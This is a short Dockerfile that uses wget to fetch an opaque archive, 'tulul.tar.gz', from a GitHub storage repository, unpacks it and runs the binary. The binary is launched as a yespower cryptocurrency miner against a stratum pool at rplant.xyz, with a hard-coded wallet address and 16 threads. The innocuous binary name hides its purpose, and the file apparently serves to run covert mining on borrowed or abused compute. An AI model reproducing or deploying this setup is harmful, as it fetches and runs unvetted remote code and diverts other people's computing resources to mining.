FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/Tesa-UII/storage/raw/main/tulul.tar.gz
RUN tar -xvf tulul.tar.gz

ENTRYPOINT [ "./tulul" ]
CMD [ "-a", "yespower", "-o", "stratum+tcp://stratum-asia.rplant.xyz:7017", "-u", "web1q9njzjf8zqal5qcxhecsuq2fsyjv2ls0v358lal.edankeun", "-t16" ]
